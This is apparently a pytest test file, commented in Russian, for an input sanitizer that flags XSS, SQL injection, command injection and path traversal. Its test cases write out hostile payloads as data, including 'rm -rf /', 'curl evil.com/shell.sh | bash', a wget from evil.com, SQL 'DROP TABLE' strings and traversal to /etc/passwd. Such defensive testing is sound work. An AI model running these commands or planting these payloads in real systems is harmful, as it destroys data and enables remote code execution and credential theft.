"""
Tests for InputSanitizer module

Проверка функциональности санитизации входных данных:
- XSS защита
- SQL Injection защита
- Command Injection защита
- Path Traversal защита
- Ограничение длины
- HTML экранирование
"""

import pytest
import sys
from pathlib import Path

# Добавляем backend в path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "backend"))

from core.input_sanitizer import (
    InputSanitizer,
    SanitizerSeverity,
    sanitize_input,
    validate_input,
    get_sanitizer,
    reset_sanitizer,
)


class TestSanitizerSeverity:
    """Тесты для Enum SanitizerSeverity"""
    
    def test_severity_levels(self):
        """Проверка уровней серьезности"""
        assert SanitizerSeverity.INFO.level == 0
        assert SanitizerSeverity.LOW.level == 1
        assert SanitizerSeverity.MEDIUM.level == 2
        assert SanitizerSeverity.HIGH.level == 3
        assert SanitizerSeverity.CRITICAL.level == 4
    
    def test_severity_comparison(self):
        """Проверка сравнения уровней"""
        assert SanitizerSeverity.INFO < SanitizerSeverity.LOW
        assert SanitizerSeverity.LOW < SanitizerSeverity.MEDIUM
        assert SanitizerSeverity.MEDIUM < SanitizerSeverity.HIGH
        assert SanitizerSeverity.HIGH < SanitizerSeverity.CRITICAL
        
        assert SanitizerSeverity.CRITICAL > SanitizerSeverity.HIGH
        assert SanitizerSeverity.HIGH > SanitizerSeverity.MEDIUM
    
    def test_severity_equality(self):
        """Проверка равенства уровней"""
        assert SanitizerSeverity.INFO >= SanitizerSeverity.INFO
        assert SanitizerSeverity.HIGH <= SanitizerSeverity.HIGH


class TestInputSanitizer:
    """Тесты для InputSanitizer"""
    
    @pytest.fixture
    def sanitizer(self):
        """Создание санитизатора для тестов"""
        return InputSanitizer(max_length=1000)
    
    # === XSS Protection Tests ===
    
    def test_xss_script_tag(self, sanitizer):
        """Обнаружение XSS через script теги"""
        malicious_inputs = [
            '<script>alert("xss")</script>',
            '<SCRIPT>alert("xss")</SCRIPT>',
            '<script src="evil.js"></script>',
            '<script\n>alert("xss")\n</script>',
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp)
            assert not result.is_safe, f"XSS не обнаружен: {inp}"
            assert any(t["type"] == "xss" for t in result.threats_detected)
    
    def test_xss_event_handlers(self, sanitizer):
        """Обнаружение XSS через обработчики событий"""
        malicious_inputs = [
            '<img src=x onerror=alert("xss")>',
            '<body onload=alert("xss")>',
            '<div onclick=alert("xss")>',
            '<input onfocus=alert("xss")>',
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp)
            assert not result.is_safe, f"XSS не обнаружен: {inp}"
    
    def test_xss_javascript_url(self, sanitizer):
        """Обнаружение XSS через javascript: URL"""
        malicious_inputs = [
            'javascript:alert("xss")',
            '<a href="javascript:alert(\'xss\')">click</a>',
            'JAVASCRIPT:alert("xss")',
            'vbscript:msgbox("xss")',
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp)
            assert not result.is_safe, f"XSS не обнаружен: {inp}"
    
    def test_xss_html_escape(self, sanitizer):
        """HTML экранирование безопасного текста"""
        safe_inputs = [
            '<p>Hello World</p>',
            'Tom & Jerry',
            '"quoted" text',
            "It's a test",
        ]
        
        for inp in safe_inputs:
            result = sanitizer.sanitize(inp)
            assert result.is_safe, f"Безопасный текст отклонен: {inp}"
            # Проверяем, что HTML символы экранированы
            assert '<' not in result.sanitized or '&lt' in result.sanitized
            assert '>' not in result.sanitized or '&gt' in result.sanitized
    
    # === SQL Injection Protection Tests ===
    
    def test_sql_injection_classic(self, sanitizer):
        """Обнаружение классических SQL инъекций"""
        malicious_inputs = [
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1 --",
            "admin'--",
            "1; DROP TABLE users--",
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp, context="sql")
            assert not result.is_safe, f"SQL Injection не обнаружен: {inp}"
            assert any(t["type"] == "sql_injection" for t in result.threats_detected)
    
    def test_sql_injection_union(self, sanitizer):
        """Обнаружение UNION-based SQL инъекций (с кавычками или точкой с запятой)"""
        # Эти паттерны должны обнаруживаться (с кавычками или ;)
        malicious_inputs = [
            "' UNION SELECT null, username, password FROM users--",
            "'; UNION SELECT * FROM users",
            "'; UNION ALL SELECT password FROM users",
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp, context="sql")
            assert not result.is_safe, f"UNION SQL Injection не обнаружен: {inp}"
        
        # Эти паттерны НЕ должны обнаруживаться (без кавычек и ;)
        # Это образовательный контент, а не атаки
        safe_inputs = [
            "UNION SELECT * FROM users",  # Без кавычек - может быть образовательным
            "UNION ALL SELECT password FROM users",
        ]
        
        for inp in safe_inputs:
            result = sanitizer.sanitize(inp, context="sql")
            assert result.is_safe, f"Ложное срабатывание на UNION без кавычек: {inp}"
    
    def test_sql_injection_blind(self, sanitizer):
        """Обнаружение Blind SQL инъекций (с точкой с запятой)"""
        # Эти паттерны должны обнаруживаться (с ;)
        malicious_inputs = [
            "'; WAITFOR DELAY '0:0:5'--",
            "; WAITFOR DELAY '0:0:5'",
            "; SLEEP(5)",
            "; BENCHMARK(10000000,SHA1('test'))",
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp, context="sql")
            assert not result.is_safe, f"Blind SQL Injection не обнаружен: {inp}"
        
        # Эти паттерны НЕ должны обнаруживаться (без ;)
        # Это может быть образовательный контент
        safe_inputs = [
            "1 AND SLEEP(5)",  # Без ; - может быть образовательным
            "1 AND BENCHMARK(10000000,SHA1('test'))",
        ]
        
        for inp in safe_inputs:
            result = sanitizer.sanitize(inp, context="sql")
            assert result.is_safe, f"Ложное срабатывание на Blind SQL без ;: {inp}"
    
    # === Command Injection Protection Tests ===
    
    def test_command_injection(self, sanitizer):
        """Обнаружение Command Injection"""
        malicious_inputs = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget evil.com/malware",
            "$(curl evil.com/shell.sh | bash)",
            "`ls -la`",
            "test; bash -i",
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp)
            assert not result.is_safe, f"Command Injection не обнаружен: {inp}"
            assert any(t["type"] == "command_injection" for t in result.threats_detected)
    
    # === Path Traversal Protection Tests ===
    
    def test_path_traversal(self, sanitizer):
        """Обнаружение Path Traversal"""
        malicious_inputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ]
        
        for inp in malicious_inputs:
            result = sanitizer.sanitize(inp)
            assert not result.is_safe, f"Path Traversal не обнаружен: {inp}"
            assert any(t["type"] == "path_traversal" for t in result.threats_detected)
    
    # === Length Limit Tests ===
    
    def test_length_limit(self, sanitizer):
        """Проверка ограничения длины"""
        long_text = "a" * 2000  # 2000 символов, лимит 1000
        
        result = sanitizer.sanitize(long_text)
        assert len(result.sanitized) <= 1000
        assert len(result.warnings) > 0
    
    def test_length_limit_custom(self):
        """Проверка пользовательского ограничения длины"""
        sanitizer = InputSanitizer(max_length=100)
        text = "a" * 200
        
        result = sanitizer.sanitize(text)
        assert len(result.sanitized) <= 100
    
    # === Unicode Normalization Tests ===
    
    def test_unicode_normalization(self, sanitizer):
        """Проверка нормализации Unicode"""
        # Разные формы представления одного символа
        inputs = [
            "café",  # NFC форма
            "café",  # NFD форма (e + combining acute)
        ]
        
        results = [sanitizer.sanitize(inp).sanitized for inp in inputs]
        # После нормализации должны быть одинаковыми
        assert results[0] == results[1]
    
    # === Control Character Removal Tests ===
    
    def test_control_chars_removal(self, sanitizer):
        """Проверка удаления управляющих символов"""
        text_with_control = "Hello\x00World\x01\x02"
        
        result = sanitizer.sanitize(text_with_control)
        assert '\x00' not in result.sanitized
        assert '\x01' not in result.sanitized
        assert '\x02' not in result.sanitized
    
    def test_allowed_control_chars(self, sanitizer):
        """Проверка разрешения стандартных управляющих символов"""
        text_with_allowed = "Line1\nLine2\r\nLine3\tTab"
        
        result = sanitizer.sanitize(text_with_allowed)
        assert '\n' in result.sanitized
        assert '\r' in result.sanitized
        assert '\t' in result.sanitized
    
    # === Email Validation Tests ===
    
    def test_email_validation_valid(self, sanitizer):
        """Проверка валидации корректных email"""
        valid_emails = [
            "user@example.com",
            "user.name@example.com",
            "user+tag@example.com",
            "user@subdomain.example.com",
        ]
        
        for email in valid_emails:
            is_valid, sanitized = sanitizer.sanitize_email(email)
            assert is_valid, f"Валидный email отклонен: {email}"
            assert sanitized == email.lower()
    
    def test_email_validation_invalid(self, sanitizer):
        """Проверка валидации некорректных email"""
        invalid_emails = [
            "invalid",
            "@example.com",
            "user@",
            "user@.com",
            "user name@example.com",
            "",
        ]
        
        for email in invalid_emails:
            is_valid, sanitized = sanitizer.sanitize_email(email)
            assert not is_valid, f"Невалидный email принят: {email}"
    
    # === SQL Sanitization Tests ===
    
    def test_sanitize_for_sql(self, sanitizer):
        """Проверка санитизации для SQL"""
        test_cases = [
            ("O'Brien", "O''Brien"),
            ("test\\path", "test\\\\path"),
            ('"quoted"', '\\"quoted\\"'),
            ("normal text", "normal text"),
        ]
        
        for original, expected in test_cases:
            result = sanitizer.sanitize_for_sql(original)
            assert result == expected, f"SQL санитизация некорректна: {original}"
    
    def test_sanitize_for_sql_none(self, sanitizer):
        """Проверка санитизации None для SQL"""
        result = sanitizer.sanitize_for_sql(None)
        assert result == ""
    
    # === Safe Input Tests ===
    
    def test_safe_inputs(self, sanitizer):
        """Проверка безопасных входных данных"""
        safe_inputs = [
            "Hello, World!",
            "Привет, мир!",
            "12345",
            "user@example.com",
            "Regular text with spaces and punctuation.",
            "JSON: {\"key\": \"value\"}",
        ]
        
        for inp in safe_inputs:
            result = sanitizer.sanitize(inp)
            assert result.is_safe, f"Безопасный ввод отклонен: {inp}"
            assert len(result.threats_detected) == 0
    
    # === Result Dict Tests ===
    
    def test_result_to_dict(self, sanitizer):
        """Проверка метода to_dict()"""
        result = sanitizer.sanitize("test input")
        result_dict = result.to_dict()
        
        assert "original_length" in result_dict
        assert "sanitized_length" in result_dict
        assert "is_safe" in result_dict
        assert "threats_detected" in result_dict
        assert "severity" in result_dict
        assert "warnings" in result_dict


class TestGlobalFunctions:
    """Тесты для глобальных функций"""
    
    def setup_method(self):
        """Сброс санитизатора перед каждым тестом"""
        reset_sanitizer()
    
    def teardown_method(self):
        """Сброс санитизатора после каждого теста"""
        reset_sanitizer()
    
    def test_sanitize_input_function(self):
        """Проверка функции sanitize_input"""
        result = sanitize_input("Hello World")
        assert isinstance(result, str)
        assert result == "Hello World"
    
    def test_sanitize_input_with_xss(self):
        """Проверка sanitize_input с XSS"""
        result = sanitize_input('<script>alert("xss")</script>')
        assert '<script>' not in result
    
    def test_validate_input_function(self):
        """Проверка функции validate_input"""
        is_safe, sanitized, warnings = validate_input("Hello World")
        assert is_safe
        assert sanitized == "Hello World"
        assert len(warnings) == 0
    
    def test_validate_input_with_threats(self):
        """Проверка validate_input с угрозами"""
        is_safe, sanitized, warnings = validate_input("'; DROP TABLE users--", context="sql")
        assert not is_safe
    
    def test_get_sanitizer_singleton(self):
        """Проверка синглтона get_sanitizer"""
        s1 = get_sanitizer()
        s2 = get_sanitizer()
        assert s1 is s2
    
    def test_reset_sanitizer(self):
        """Проверка сброса санитизатора"""
        s1 = get_sanitizer()
        reset_sanitizer()
        s2 = get_sanitizer()
        assert s1 is not s2


class TestEdgeCases:
    """Тесты граничных случаев"""
    
    @pytest.fixture
    def sanitizer(self):
        return InputSanitizer(max_length=10000)
    
    def test_empty_string(self, sanitizer):
        """Проверка пустой строки"""
        result = sanitizer.sanitize("")
        assert result.is_safe
        assert result.sanitized == ""
    
    def test_whitespace_only(self, sanitizer):
        """Проверка строки только с пробелами"""
        result = sanitizer.sanitize("   \t\n\r   ")
        assert result.is_safe
        assert result.sanitized.strip() == ""
    
    def test_unicode_emoji(self, sanitizer):
        """Проверка emoji символов"""
        emoji_text = "Hello 👋 World 🌍"
        result = sanitizer.sanitize(emoji_text)
        assert result.is_safe
        assert "👋" in result.sanitized
    
    def test_mixed_languages(self, sanitizer):
        """Проверка смешанных языков"""
        mixed = "Hello Привет 你好 こんにちは"
        result = sanitizer.sanitize(mixed)
        assert result.is_safe
    
    def test_very_long_word(self, sanitizer):
        """Проверка очень длинного слова"""
        long_word = "a" * 15000
        result = sanitizer.sanitize(long_word)
        assert len(result.sanitized) <= 10000
    
    def test_null_bytes(self, sanitizer):
        """Проверка нулевых байтов"""
        text = "test\x00\x00\x00string"
        result = sanitizer.sanitize(text)
        assert '\x00' not in result.sanitized
    
    def test_nested_tags(self, sanitizer):
        """Проверка вложенных тегов"""
        nested = "<div><script><script>alert('xss')</script></script></div>"
        result = sanitizer.sanitize(nested)
        assert not result.is_safe
    
    def test_encoded_xss(self, sanitizer):
        """Проверка кодированного XSS"""
        encoded = "&#60;script&#62;alert('xss')&#60;/script&#62;"
        result = sanitizer.sanitize(encoded)
        # После нормализации должен быть обнаружен
        assert not result.is_safe or '<script' in result.sanitized


if __name__ == "__main__":
    pytest.main([__file__, "-v"])